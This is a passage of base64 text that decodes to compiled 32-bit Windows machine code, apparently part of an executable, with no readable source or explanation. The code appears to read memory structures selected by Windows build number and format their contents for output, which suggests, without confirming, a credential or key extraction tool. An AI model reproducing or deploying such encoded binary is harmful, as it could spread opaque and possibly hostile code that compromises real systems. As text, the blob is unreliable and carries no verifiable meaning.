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lEJAw7w3RSalSLxlCNRCQcUOjf8v7/g8QMhcB0PIuEJJAAAACJRCQMO8N0LY1EJCSJRCQUahyLxlCNRCQcUOiy8v7/g8QMhcB0D2gAAABAjUQkLOjE4P//WV9eW4vlXcIEAGoBuHCVARDo7tz//1nDVYvsg+T4g+wcU1YzwI1MJBxXi30IiUwkHIsPiUQkIIlEJCSJRCQYiUQkEIsRiVQkFDkFWMMCEHUwaETcAhBQaEDcAhBqBWiAwwIQvkDDAhDokeX//4PEFIXAdQ1owPEBEOhn+/7/WetxoUDcAhD/dwiLHUTcAhCJRCQUjUQkFFBqEF6DwxjoIOb//1lZiUQkEIXAdEVTakD/FQySARCJRCQYhcB0NFONRCQUUI1EJCBQ6M/x/v+DxAyFwHQToUTcAhCLTCQYagADwejd3///Wf90JBj/FRCSARBfXluL5V3CBAD/JQCQARD/JQSQARD/JQiQARD/JVCQARD/JWCQARD/JbCQARD/JbSQARD/JbyQARD/JcyQARD/JcCSARD/JaySARD/JbySARD/JbiSARD/JbSSARD/JbCSARD/JVCSARD/JVSSARD/JViSARD/JVySARD/JUySARD/JUiSARD/JUSSARD/JUCSARD/JTySARD/JSiSARD/JTiSARD/JSySARD/JTCSARD/JTSSARD/JYiSARD/JXySARD/JYySARD/JYCSARD/JYSSARD/JaSSARD/JZySARD/JaCSARD/JaSTARD/JaCTARD/JZyTARD/JZiTARD/JZSTARD/JZCTARD/JYyTARD/JYiTARD/JYSTARD/JYCTARD/JWCTARD/JaiTARD/JayTARD/JbCTARD/JbSTARD/JbiTARD/JbyTARD/JcCTARD/JcSTARD/JciTARCL/1WL7IHs0AIAAKEAwAIQM8WJRfyJheD9//+Jjdz9//+Jldj9//+JndT9//+JtdD9//+Jvcz9//9mjJX4/f//ZoyN7P3//2aMncj9//9mjIXE/f//ZoylwP3//2aMrbz9//+cj4Xw/f//i0UEiYXo/f//jUUEx4Uw/f//AQABAImF9P3//4tA/GjwkwEQiYXk/f///xVEkQEQi038M83oFAAAAMnDi/9Vi+xd6U/////M/yUUkwEQOw0AwAIQdQPCAADpgwkAAIv/VYvsU1aLdQgz2zvzdAU5XQx3IP8VFJMBEMcAFgAAAFNTU1NT6LP///+DxBSDyP9eW13DOV0QdNv/dRT/dRD/dQxW6EUYAACDxBA7w33hiB6D+P511/8VFJMBEMcAIgAAAOu8i/9Vi+yNRRRQ/3UQ/3UM/3UI6IT///+DxBBdw4v/VYvsVleLfQgz9jv+dAU5dQx3IP8VFJMBEMcAFgAAAFZWVlZW6DL///+DxBSDyP9fXl3DOXUQdNv/dRT/dRD/dQxX6DMkAACDxBA7xn3hM8lmiQ+D+P511P8VFJMBEMcAIgAAAOu5i/9Vi+yNRRRQ/3UQ/3UM/3UI6IH///+DxBBdw4v/VYvsVjP2OXUMdR7/FRSTARBWVlZWVscAFgAAAOi2/v//g8QUg8j/6yeLRQiNUAJmiwhAQGY7znX2jU0QUf91DCvC0fhQ/3UI6AM4AACDxBBeXcOL/1WL7ItVCFNWVzP/O9d0B4tdDDvfdx7oc/7//2oWXokwV1dXV1foWP7//4PEFIvGX15bXcOLdRA793UHM8BmiQLr1IvKZjk5dAVBQUt19jvfdOkPtwZmiQFBQUZGZjvHdANLde4zwDvfdcVmiQLoHP7//2oiWYkIi/HrpYv/VYvsi1UIU1ZXM/8713QHi10MO993Huj2/f//ahZeiTBXV1dXV+jb/f//g8QUi8ZfXltdw4t1EDv3dQczwGaJAuvUi8oPtwZmiQFBQUZGZjvHdANLde4zwDvfddNmiQLorf3//2oiWYkIi/Hrs1NWV4tUJBCLRCQUi0wkGFVSUFFRaPQsARBk/zUAAAAAoQDAAhAzxIlEJAhkiSUAAAAAi0QkMItYCItMJCwzGYtwDIP+/nQ7i1QkNIP6/nQEO/J2Lo00do1csxCLC4lIDIN7BAB1zGgBAQAAi0MI6BI3AAC5AQAAAItDCOgkNwAA67BkjwUAAAAAg8QYX15bw4tMJAT3QQQGAAAAuAEAAAB0M4tEJAiLSAgzyOj6/P//VYtoGP9wDP9wEP9wFOg+////g8QMXYtEJAiLVCQQiQK4AwAAAMNVi0wkCIsp/3Ec/3EY/3Eo6BX///+DxAxdwgQAVVZXU4vqM8Az2zPSM/Yz///RW19eXcOL6ovxi8FqAehvNgAAM8Az2zPJM9Iz///mVYvsU1ZXagBqAGibLQEQUeg3UwAAX15bXcNVi2wkCFJR/3QkFOi0/v//g8QMXcIIAMzMzMzMzMzMzIv/VYvsg+wYi0UIU4tdFFaLcwgzMFeLBsZF/wDHRfQBAAAAjXsQg/j+dAuLTgQDzzMMOP9VDItODItWCAPPMww6/1UMi0UQ9kAEZg+FEgEAAI1N6IlL/ItbDIlF6ItFGIlF7IP7/nRg6waNmwAAAACNFFuLTJYUjUSWEIlF8IsAiUX4hcl0FIvX6Aj////GRf8BhcB8PH9Di0X4i9iD+P51zoB9/wB0IIsGg/j+dAuLTgQDzzMMOP9VDItODItWCAPPMww6/1UMi0X0X15bi+Vdw8dF9AAAAADrzYtFEIE4Y3Nt4HUpgz1g3AIQAHQgaGDcAhDo2zUAAIPEBIXAdA+LTRBqAVH/FWDcAhCDxAiLTRTor/7//4tFFDlYDHQRi1UIUleL04vI6LP+//+LRRSLTfiJSAyLBoP4/nQLi04EA88zDDj/VQyLTgyLVggDzzMMOv9VDItF8ItICIvX6Er+//+6/v///zlTDA+EV////4tNCFFXi8voY/7//+km////i/9Vi+y4Y3Nt4DlFCHUN/3UMUOimNQAAWVldwzPAXcOL/1WL7FaLdQgzwOsPhcB1EIsOhcl0Av/Rg8YEO3UMcuxeXcNogAAAAP8VRJMBEFmjVNwCEKNQ3AIQhcB1AkDDgyAAM8DDi/9Vi+xTM8BWVzlFDHUmOQUQ2AIQfhf/DRDYAhCLPTiRARBQvkzcAhDp5QAAADPA6UsBAACDfQwBD4U+AQAAZIsNGAAAAItZBIs9OJEBEIlFDFC+TNwCEOsRO8N0F2joAwAA/xVokQEQagBTVv/XhcB15+sHx0UMAQAAAKFI3AIQagJfhcB0CWof6NU0AADrOWjskwEQaOSTARDHBUjcAhABAAAA6BD///9ZWYXAD4V6////aOCTARBo3JMBEOibNAAAWYk9SNwCEDPbWTldDHUIU1b/FTyRARA5HVzcAhB0HGhc3AIQ6AA0AABZhcB0Df91EFf/dQj/FVzcAhD/BRDYAhDrd2joAwAA/xVokQEQagBqAVb/14XAdeqhSNwCEIP4AnQKah/oNzQAAFnrTYsdVNwCEIXbdDCLPVDcAhCDx/zrC4sHhcB0Av/Qg+8EO/tz8VP/FTCTARCDJVDcAhAAgyVU3AIQAFlqAFbHBUjcAhAAAAAA/xU8kQEQM8BAX15bXcIMAGosaHiaAhDo3TMAAItNDDPSQolV5DP2iXX8iQ0owAIQO851EDk1ENgCEHUIiXXk6QYCAAA7ynQJg/kCD4WNAAAAoVjcAhA7xnQ2iVX8iRUU2AIQ/3UQUf91CP/QiUXk6xyLReyLCIsJiU3gUFHoof3//1lZw4tl6DP2iXXkiXX8OXXkD4SxAQAAx0X8AgAAAP91EP91DP91COjb/f//iUXk6xyLReyLCIsJiU3cUFHoX/3//1lZw4tl6DP2iXXkiXX8OXXkD4RvAQAAi00Mx0X8AwAAAP91EFH/dQjoAjMAAIlF5Osci0XsiwiLCYlN2FBR6Bz9//9ZWcOLZegz9ol15Il1/IN9DAEPhZwAAAA5deQPhZMAAADHRfwEAAAAVlb/dQjoujIAAOsZi0XsiwiLCYlN1FBR6Nf8//9ZWcOLZegz9ol1/MdF/AUAAABWVv91COgh/f//6xmLReyLCIsJiU3QUFHoqPz//1lZw4tl6DP2iXX8oVjcAhA7xnQsx0X8BgAAAFZW/3UI/9DrGYtF7IsIiwmJTcxQUehz/P//WVnDi2XoM/aJdfw5dQx0CoN9DAMPhYAAAADHRfwHAAAA/3UQ/3UM/3UI6Kr8//+JReTrHItF7IsIiwmJTchQUegu/P//WVnDi2XoM/aJdeSJdfyhWNwCEDvGdD45NRTYAhB0NsdF/AgAAAD/dRD/dQz/dQj/0IlF5Osci0XsiwiLCYlNxFBR6Of7//9ZWcOLZegz9ol15Il1/MdF/P7////oCwAAAItF5OjgMQAAwgwAxwUowAIQ/////8OL/1WL7IN9DAF1Bej7MQAAXemO/f//i/9Vi+yB7CgDAACjGNkCEIkNFNkCEIkVENkCEIkdDNkCEIk1CNkCEIk9BNkCEGaMFTDZAhBmjA0k2QIQZowdANkCEGaMBfzYAhBmjCX42AIQZowt9NgCEJyPBSjZAhCLRQCjHNkCEItFBKMg2QIQjUUIoyzZAhCLheD8///HBWjYAhABAAEAoSDZAhCjJNgCEMcFGNgCEAkEAMDHBRzYAhABAAAAoQDAAhCJhdj8//+hBMACEImF3Pz//2oA/xUskQEQaCiUARD/FTCRARBoCQQAwP8V+JEBEFD/FTSRARDJw8zMzMzMzMzMzMzMzMxWi0QkFAvAdSiLTCQQi0QkDDPS9/GL2ItEJAj38Yvwi8P3ZCQQi8iLxvdkJBAD0etHi8iLXCQQi1QkDItEJAjR6dHb0erR2AvJdfT384vw92QkFIvIi0QkEPfmA9FyDjtUJAx3CHIPO0QkCHYJTitEJBAbVCQUM9srRCQIG1QkDPfa99iD2gCLyovTi9mLyIvGXsIQAMz/JTiTARD/JciSARCL/1WL7IN9DAB3E4tFCHIFg/j/dwmLTRCJATPAXcOLRRCDCP+4FgIHgF3Di/9Vi+yLRQj3ZQz/dRBSUOjA////g8QMXcP2QQxAdAaDeQgAdCT/SQR4C4sRiAL/AQ+2wOsMD77AUVDoN0YAAFlZg/j/dQMJBsP/BsOL/1WL7FaL8OsTi00QikUI/00M6LX///+DPv90BoN9DAB/515dw4v/VYvs9kcMQFNWi/CL2XQzg38IAHUti0UIAQbrLIoD/00Ii8/off///0ODPv91FP8VFJMBEIM4KnUPi8+wP+hj////g30IAH/UXltdw4v/VYvsg+wooQDAAhAzxYlF/ItFCIlF2DPAQFeLfQyERRx0BINtFCD2RRyAxkXcJXQHagLGRd0jWFbGRAXcLmoKjUQF3VD/dRj/FfiSARCNRdyDxAyNcAGKCECEyXX5ik0UK8aITAXcxkQF3QCLRRCNdAf/xgYAUVGLTdjdAY1N3N0cJFFQV/8V/JIBEIPEFIA+AF51CIXAfgQzwOsGahbGBwBYi038M81f6EHz///Jw4v/VYvsg+wMoQDAAhAzxYlF/FNWi3UIV4t9DDPbO/t1FDldEHYPO/MPhKoAAACJHumjAAAAO/N0A4MO/4F9EP///392Hv8VFJMBEGoWWVNTU1NTi/GJCOjR8v//g8QUi8brd/91FI1F9FD/FfSSARA7w1lZfSU7+3QSOV0Qdg3/dRBTV+jO/f//g8QM/xUUkwEQaipZiQiLwes/O/N0AokGOUUQfSA7+3QSOV0Qdg3/dRBTV+ie/f//g8QM/xUUkwEQaiLrhzv7dA5QjUX0UFfoiP3//4PEDDPAi038X14zzVvoWPL//8nDi/9Vi+yB7GgCAAChAMACEDPFiUX8i0UIU4tdDFYz9leLfRCJhbT9//+Jvdz9//+Jtbj9//+JtfD9//+Jtcz9//+Jtej9//+JtdD9//+JtcT9//+JtbD9//+Jtcj9//87xnUh/xUUkwEQVlZWVlbHABYAAADoy/H//4PEFIPI/+lACgAAO95024oLibXY/f//ibXg/f//ibXA/f//ibW8/f//iI3v/f//hMkPhA4KAABDObXY/f//iZ2g/f//D4zmCQAAisEsIDxYdw8PvsEPtoAYlAEQg+AP6wIzwIuVwP3//2vACQ+2hBA4lAEQwegEiYXA/f//g/gID4Rk////agdaO8IPh1YJAAD/JIWMQgEQg43o/f///4m1xP3//4m1sP3//4m1zP3//4m10P3//4m18P3//4m1yP3//+ktCQAAD77Bg+ggdEqD6AN0NoPoCHQlSEh0FYPoAw+FAAkAAION8P3//wjpAgkAAION8P3//wTp9ggAAION8P3//wHp6ggAAIGN8P3//4AAAADp2wgAAION8P3//wLpzwgAAID5KnUriweDxwQ7xom93P3//4mFzP3//w+NsQgAAION8P3//wT3ncz9///pnwgAAIuFzP3//2vACg++yY1ECNCJhcz9///phAgAAIm16P3//+l5CAAAgPkqdSWLB4PHBDvGib3c/f//iYXo/f//D41bCAAAg43o/f///+lPCAAAi4Xo/f//a8AKD77JjUQI0ImF6P3//+k0CAAAgPlJdE+A+Wh0PoD5bHQYgPl3D4UcCAAAgY3w/f//AAgAAOkNCAAAgDtsdRBDgY3w/f//ABAAAOn4BwAAg43w/f//EOnsBwAAg43w/f//IOngBwAAigM8NnUXgHsBNHURQ0OBjfD9//8AgAAA6cMHAAA8M3UXgHsBMnURQ0OBpfD9////f///6agHAAA8ZA+EoAcAADxpD4SYBwAAPG8PhJAHAAA8dQ+EiAcAADx4D4SABwAAPFgPhHgHAACJtcD9//8PtsFQibXI/f///xUIkwEQWYXAdCiLjbT9//+Khe/9//+Ntdj9///ol/r//4oDQ4iF7/3//4TAD4RIBwAAi420/f//ioXv/f//jbXY/f//6G/6///pFwcAAA++wYP4ZA+PFgIAAA+EZwIAAIP4Uw+P8gAAAA+EgAAAAIPoQXQQSEh0WEhIdAhISA+FRQUAAIDBIMeFxP3//wEAAACIje/9//+DjfD9//9AObXo/f//jYX0/f//iYXk/f//uAACAACJhaz9//8PjTUCAADHhej9//8GAAAA6ZQCAAD3hfD9//8wCAAAD4WYAAAAgY3w/f//AAgAAOmJAAAA94Xw/f//MAgAAHUKgY3w/f//AAgAAIuN6P3//4P5/3UFuf///3+DxwT3hfD9//8QCAAAib3c/f//i3/8ib3k/f//D4RkBAAAO/51C6EUwAIQiYXk/f//i4Xk/f//x4XI/f//AQAAAOkyBAAAg+hYD4SNAgAASEh0eSvCD4Qn////SEgPhVEEAACDxwT3hfD9//8QCAAAib3c/f//dDAPt0f8UGgAAgAAjYX0/f//UI2F4P3//1DoZvr//4PEEIXAdB/HhbD9//8BAAAA6xOKR/yIhfT9///HheD9//8BAAAAjYX0/f//iYXk/f/